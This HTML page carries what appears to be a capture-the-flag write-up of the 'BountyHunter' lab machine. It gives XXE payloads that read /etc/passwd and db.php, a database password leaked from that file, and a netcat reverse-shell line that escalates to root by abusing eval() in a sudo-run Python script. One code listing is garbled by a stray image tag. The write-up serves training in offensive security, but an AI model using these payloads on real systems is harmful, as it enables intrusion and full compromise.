<!DOCTYPE html>
<html lang="en" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="External Recon # We start with nmap to do our external recon:
Nmap scan report for 10.129.192.33 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We find a ssh service on port 22 and http service on port 80.">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="//localhost:1313/docs/blogtest/bountyhunter/">
  <meta property="og:site_name" content="www.tagnull.de">
  <meta property="og:title" content="BountyHunter - WriteUp">
  <meta property="og:description" content="External Recon # We start with nmap to do our external recon:
Nmap scan report for 10.129.192.33 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We find a ssh service on port 22 and http service on port 80.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">
    <meta property="article:published_time" content="2021-11-20T17:54:29+02:00">
    <meta property="article:modified_time" content="2021-11-20T17:54:29+02:00">
<title>BountyHunter - WriteUp | www.tagnull.de</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/logo.png" >
<link rel="canonical" href="//localhost:1313/docs/blogtest/bountyhunter/">
<link rel="stylesheet" href="/book.min.ed4ea100bc0474b4bd01f1e54b29b3e384852ec121eefa92d93ca6dba227b292.css" integrity="sha256-7U6hALwEdLS9AfHlSymz44SFLsEh7vqS2Tym26InspI=" crossorigin="anonymous">
  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.34efe43386bbd7e2d8b7480f02480b1555b4336e2ff1a69fa18eb549451d1bf4.js" integrity="sha256-NO/kM4a71&#43;LYt0gPAkgLFVW0M24v8aafoY61SUUdG/Q=" crossorigin="anonymous"></script>

  

<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>www.tagnull.de</span>
  </a>
</h2>


<div class="book-search hidden">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>












  



  
  <ul>
    
      
        <li class="book-section-flat" >
          
  
  

  
    <span>Cheatsheet</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-2860456b7de11418b89bc572c43149f3" class="toggle"  />
    <label for="section-2860456b7de11418b89bc572c43149f3" class="flex justify-between">
      <a role="button" class="">Enumeration</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/cheatsheet/enumeration/nmap/" class="">network</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cheatsheet/enumeration/web/" class="">web</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-300439dc6c81e7f8106c3eab98675b63" class="toggle"  />
    <label for="section-300439dc6c81e7f8106c3eab98675b63" class="flex justify-between">
      <a role="button" class="">Active Directory</a>
    </label>
  

          
  <ul>
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-2e622ee6779934ecb9dc3f9b2959e822" class="toggle" checked />
    <label for="section-2e622ee6779934ecb9dc3f9b2959e822" class="flex justify-between">
      <a role="button" class="">Blogtest</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/blogtest/bountyhunter/" class="active">BountyHunter - WriteUp</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>











  
<ul>
  
  <li>
    <a href="/posts/"  >
        Blog
      </a>
  </li>
  
</ul>






</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>BountyHunter - WriteUp</strong>

  <label for="toc-control">
    
  </label>
</div>


  
 
      </header>

      
      
  <article class="markdown book-article"><h1 id="external-recon">
  External Recon
  <a class="anchor" href="#external-recon">#</a>
</h1>
<p>We start with <code>nmap</code> to do our external recon:</p>
<pre tabindex="0"><code>Nmap scan report for 10.129.192.33

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><p>We find a ssh service on port 22 and http service on port 80. http is usually a better target as ssh. So I start there.
The website boast a bounty hunter service. First I click on all visible links and menus to get a feeling for the website.
What works, what doesn&rsquo;t work. But interfaces do I have - like input fields for example.</p>
<p>The only thing that sticks out is the &ldquo;portal&rdquo; page.</p>
<p>
  <img src="portal.png" alt="portal.png" /></p>
<p>It&rsquo;s under development. An indicator that not all features (like propper coding) are ready.
The &ldquo;Go here&rdquo; link leads us to a bounty Report system which seems to be in a beta stadium.</p>
<p>
  <img src="bounty-report-system.png" alt="bounty-report-system.png" /></p>
<p>Before we start messing with the system, which might take a bit, I started <code>gobuster</code> to do some background recon.</p>
<pre tabindex="0"><code>gobuster dir -u http://10.10.11.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,htm,php
</code></pre><p>I&rsquo;ll show you the output later when it becomes relevant. Let&rsquo;s focus on the bounty report system for now.
First let&rsquo;s feed it with legitimate data.</p>
<p>
  <img src="bounty-system-nice-data.png" alt="bounty-system-nice-data.png" /></p>
<p>From the output we can determine that the system will use a database in the future and that our data gets displayed back to us.
Nothing crazy on the surface. To look under the hood we need a tool like <code>burp</code> and use it as our proxy (google is your friend).</p>
<p>
  <a href="/#top">[Top]</a></p>
<h1 id="explore">
  Explore
  <a class="anchor" href="#explore">#</a>
</h1>
<p>After sending the same data again, we can capture the request with burp and take look at it.</p>
<p>
  <img src="burp-1.png" alt="burp-1.png" /></p>
<p>Interessting: We send the data to a page with a funky name:</p>
<pre tabindex="0"><code>POST http://10.10.11.100/tracker_diRbPr00f314.php
</code></pre><p>The next interessting piece of information is the custom <code>X-Header</code>:</p>
<pre tabindex="0"><code>X-Requested-With: XMLHttpRequest
</code></pre><p>So we are sending XML data. However our payload looks more like base64 than XML.</p>
<pre tabindex="0"><code>data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5BIEJ1ZzwvdGl0bGU%2BCgkJ [...snip...]
</code></pre><p>With burp we can decode the data and make it human readable.</p>
<p>
  <img src="burp-2.png" alt="burp-2.png" /></p>
<p>So we do in fact have XML formated data. Seeing this, my gut feeling is, we should try <code>XML-Entity-Injection</code> or <code>XXE</code>.</p>
<p>Before we do something complex we should try it with a simple proof of concept first. Like reading a file from the webserver.
We know it&rsquo;s a linux box, so <code>/etc/passwd</code> is a good candidate. Furthermore, I made an <code>/etc/hosts</code> entry for that box, so I can usea hostname instead of an IP. It helps sometimes.</p>
<p>I send the request to burps &ldquo;repeater&rdquo; module and changed the XML-data to read a file and include it in one of the properties that get displayed back to us.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>]&gt;
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;bugreport&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;title&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/title&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;cwe&gt;</span>1234<span style="color:#f92672">&lt;/cwe&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;cvss&gt;</span>1234<span style="color:#f92672">&lt;/cvss&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;reward&gt;</span>1234<span style="color:#f92672">&lt;/reward&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;/bugreport&gt;</span>
</span></span></code></pre></div><p>If we send this request we will indeed get the contents of <code>/etc/passwd</code>.</p>
<p>
  <img src="burp-3.png" alt="burp-3.png" /></p>
<p>
  <a href="/#top">[Top]</a></p>
<h1 id="exploit">
  Exploit
  <a class="anchor" href="#exploit">#</a>
</h1>
<p>Since we can read files from the system now, how can we use that to our advantage? First of all there is a user called &ldquo;development&rdquo; on the box.
I tried reading his <code>ssh</code> key, but wasn&rsquo;t successfull. Maybe our <code>gobuster</code> search in the background can help us?</p>
<pre tabindex="0"><code>===============================================================
2021/07/28 18:48:15 Starting gobuster
===============================================================
/index.php (Status: 200)
/resources (Status: 301)
/assets (Status: 301)
/portal.php (Status: 200)
/css (Status: 301)
/db.php (Status: 200)
/js (Status: 301)
</code></pre><p>We have three files with a status code of 200. The last one <code>db.php</code> sounds very promissing. If we adapt our proof of concept above to read <code>db.php</code> we will
get nothing. This could be because the file is not in the current working directory or more likly because it is a .php file. It gets interpreted from the webserver and
won&rsquo;t display it&rsquo;s content to us. But we can use a php-filter in our XXE attack to encode the data to base64 first.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=db.php&#34;&gt;</span>]&gt;
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;bugreport&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;title&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/title&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;cwe&gt;</span>1234<span style="color:#f92672">&lt;/cwe&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;cvss&gt;</span>1234<span style="color:#f92672">&lt;/cvss&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;reward&gt;</span>1234<span style="color:#f92672">&lt;/reward&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&lt;/bugreport&gt;</span>
</span></span></code></pre></div><p>
  <img src="burp-4.png" alt="burp-4.png" /></p>
<p>And there we have it. Some base64 encoded data. Decoding it gives us some credentials. Since password reuse is a thing, I&rsquo;ll try to use it to ssh into the machine as the user &ldquo;development&rdquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// TODO -&gt; Implement login system with the database.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$dbserver <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>;
</span></span><span style="display:flex;"><span>$dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;bounty&#34;</span>;
</span></span><span style="display:flex;"><span>$dbusername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>;
</span></span><span style="display:flex;"><span>$dbpassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;m19RoAU0hP41A1sTsq6K&#34;</span>;
</span></span><span style="display:flex;"><span>$testuser <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>
  <a href="/#top">[Top]</a></p>
<h1 id="recon">
  Recon
  <a class="anchor" href="#recon">#</a>
</h1>
<p>After a successful login via ssh, I checked my group memberships and also if I can run anything as root/sudo. And as you can see, we can indeed run a python script as root via sudo.</p>
<p>
  <img src="user-sudo.png" alt="user-sudo.png" /></p>
<p>Let&rsquo;s read and analyse the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#Skytrain Inc Ticket Validation System 0.1</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Do not distribute this file.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_file</span>(loc):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> loc<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.md&#34;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> open(loc, <span style="color:#e6db74">&#39;r&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Wrong file type.&#34;</span>)
</span></span><span style="display:flex;"><span>        exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">evaluate</span>(ticketFile):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#Evaluates a ticket to check for ireggularities.</span>
</span></span><span style="display:flex;"><span>    code_line <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i,x <span style="color:#f92672">in</span> enumerate(ticketFile<span style="color:#f92672">.</span>readlines()):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;# Skytrain Inc&#34;</span>):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;## Ticke![user-sudo.png](user-sudo.png)</span>
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Destination: </span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>join(x<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">3</span>:])<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;__Ticket Code:__&#34;</span>):
</span></span><span style="display:flex;"><span>            code_line <span style="color:#f92672">=</span> i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> code_line <span style="color:#f92672">and</span> i <span style="color:#f92672">==</span> code_line:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;**&#34;</span>):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>            ticketCode <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;**&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;+&#34;</span>)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> int(ticketCode) <span style="color:#f92672">%</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>                validationNumber <span style="color:#f92672">=</span> eval(x<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;**&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>))
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> validationNumber <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    fileName <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Please enter the path to the ticket file.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    ticket <span style="color:#f92672">=</span> load_file(fileName)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#DEBUG print(ticket)</span>
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> evaluate(ticket)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (result):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Valid ticket.&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Invalid ticket.&#34;</span>)
</span></span><span style="display:flex;"><span>    ticket<span style="color:#f92672">.</span>close
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main()
</span></span></code></pre></div><p>The script reads a file with a &ldquo;.md&rdquo; extention and checks if the string <code># Skytrain Inc</code> is in the first line of that file. Next it checks if the string <code>## Ticket to </code> is on the second line.
The third line of the &ldquo;.md&rdquo; file needs to be <code>__Ticket Code:__</code>. The fourth line needs to start with <code>**</code> and needs to contain a number. But not any number, it needs to be a number that you can
divide by 7 and get a remainder of 4. A simple modulus operation. &ldquo;102&rdquo; should work. If all those requirements are met, the script will output &ldquo;Valid ticket&rdquo; or otherwise &ldquo;Invalid ticket&rdquo;.</p>
<p>Let&rsquo;s craft a valid ticket file first as a proof of concept.</p>
<pre tabindex="0"><code># Skytrain Inc
## Ticket to 
__Ticket Code:__
** 102 **
</code></pre><p>
  <img src="ticket-poc.png" alt="ticket-poc.png" /></p>
<p>As you can see, we provided a valid ticket file. You might notice that the &ldquo;Destination&rdquo; is empty. This is because I haven&rsquo;t provided one. This is not needed to make the exploit
work. But it looks nicer. So the next interation of the ticket file will have &ldquo;development&rdquo; in the &ldquo;Ticket to&rdquo; field.</p>
<p>
  <a href="/#top">[Top]</a></p>
<h1 id="privilege-escalation">
  Privilege Escalation
  <a class="anchor" href="#privilege-escalation">#</a>
</h1>
<p>But now we need to think about a way to exploit this. If you read the code again, you might notice the <code>eval()</code> function close to the end of the script. This function can be used to run
python commands, like a system call. And since we are allowed to run the script as root those system calls are also running as root.</p>
<p>A couple of lines earlier we can see that the script get the ticket code by splitting the fourth line at a &ldquo;+&rdquo; symbol. So, if we provide a python command, in the fourth line after the ticket code,
separated by a &ldquo;+&rdquo; sign, we should get code execution. Let&rsquo;s build a new ticket file with a python reverse-shell and start a netcat listener on port 1337.</p>
<pre tabindex="0"><code># Skytrain Inc
## Ticket to development
__Ticket Code:__
** 102 + __import__(&#39;os&#39;).system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.39 1337 &gt;/tmp/f&#39;) **
</code></pre><p>
  <img src="exploit.png" alt="exploit.png" /></p>
<p>
  <img src="root.png" alt="root.png" /></p>
<p>And there we have it.</p>
<p>Have a good one!</p>
<p>x41</p>
<p>
  <a href="/#top">[Top]</a></p>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
  </main>

  
</body>
</html>












